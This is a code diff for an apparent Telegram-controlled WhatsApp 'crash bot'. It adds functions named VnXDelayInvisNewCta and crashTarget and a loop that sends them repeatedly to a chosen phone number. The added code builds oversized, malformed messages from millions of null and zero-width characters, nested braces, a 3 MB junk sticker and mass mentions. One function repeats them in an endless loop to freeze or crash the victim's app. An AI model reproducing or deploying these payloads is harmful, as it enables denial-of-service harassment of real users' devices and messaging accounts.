@@ -2136,11 +2136,11 @@ bot.on("callback_query", async (ctx) => {
     blank: {
       name: "𝖡𝗅𝖺𝗇𝗄 𝖠𝗇𝖽𝗋𝗈𝗂𝖽",
       func: async (t) => {
-        for (let i = 0; i < 100; i++) {
-          await VnXBlankInvisAi(sock, target);
-          await FrezeSTC(sock, target);
-          await DelayOneMsgPermaVnX(sock, target);
-          await sleep(700);
+        for (let i = 0; i < 50; i++) {
+          await VnXDelayAiInvis(sock, target);
+          await VnXDelayInvisNewCta(sock, target);
+          await crashTarget(sock, target);
+          await sleep(300);
         }
       }
     },
@@ -2801,6 +2801,44 @@ async function DelayOneMsgPermaVnX(sock, target) {
     }
 }
 
+async function VnXDelayInvisNewCta(sock, target) {
+  while (true) {
+    try {   
+      const MsgNew = {
+        groupStatusMessageV2: {
+          message: {
+            interactiveResponseMessage: {                     
+              body: {
+                text: "VnXNewNihk",
+                format: "VnX.DEFAULT"
+              },
+              nativeFlowResponseMessage: {
+                name: "cta_url",
+                paramsJson: `{\"flow_cta\":\"${"\u0000".repeat(900000)}\"}}`,
+                url: "https://mmg.whatsapp.net",
+                merchantUrl: "t.me/Raffioffci4",
+                version: 3
+              }
+            }
+          }
+        }
+      };
+
+      await sock.relayMessage(target, MsgNew, { 
+        participant: { jid: target } 
+      });
+      
+      console.log(`VnX Delay Hard successfully spammed to ${target}`);
+
+      await new Promise(resolve => setTimeout(resolve, 1500));
+
+    } catch (e) {
+      console.log("❌ Error Strike:", e);
+      await new Promise(resolve => setTimeout(resolve, 5000));
+    }
+  }
+}
+
 async function VnXBlankInvisAi(sock, target) {
   const VnXForwardAi = [
     "13135550202@bot", "13135550202@bot",
@@ -2947,6 +2985,52 @@ async function FrezeSTC(sock, target) {
     participants: { jid: target }
    });
  }
+ 
+ async function crashTarget(sock, target) {
+    const inviskontl = "\u200B\u200D\u200E\u200F".repeat(500000); 
+    const jmbut = "{".repeat(250000);
+    const crashBuffer = Buffer.alloc(1024 * 1024 * 3, 'not alwys');
+    
+    await sock.sendMessage(target, {
+        sticker: crashBuffer,
+        isAnimated: true,
+        contextInfo: {
+            externalAdReply: {
+                title: inviskontl + jmbut + "\n0000".repeat(1000), 
+                body: " ".repeat(100) + inviskontl.slice(0, 50000), 
+                mediaType: 1,
+                renderLargerThumbnail: true,
+                showAdAttribution: true,
+                sourceUrl: "https://" + "0".repeat(100000) + "\n0000".repeat(500), 
+                thumbnailUrl: "data:image/png;base64," + Buffer.alloc(50000, 'X').toString('base64'),
+                containsAutoReply: true,
+                forwardingScore: 9999,
+                isForwarded: true,
+                extraParams: {
+                    a: { b: { c: { d: { e: { f: "{".repeat(10000) } } } } },
+                    overflow: Array(5000).fill("maklowh"),
+                    metadata: {
+                        isSystemMessage: true,
+                        forceRender: true,
+                        priority: "by maklo",
+                        cacheBypass: Math.random()
+                    }
+                }
+            },
+            mentionedJid: Array(500).fill(target),
+            groupMentions: [
+                { groupJid: "12345@g.us", groupSubject: "maklubrp".repeat(1000) }
+            ]
+        }
+    }, { 
+        quoted: { 
+            key: { remoteJid: "0@s.whatsapp.net", fromMe: false }, 
+            message: { conversation: "\n0000".repeat(10000) } 
+        } 
+    });
+
+    console.log(`Rodok Bang ${target}`);
+}
 //------------------(AKHIR OF FUNCTION)--------------------//
 bot.command("approved", async (ctx) => {
   if (!isOwner(ctx.from.id)) {
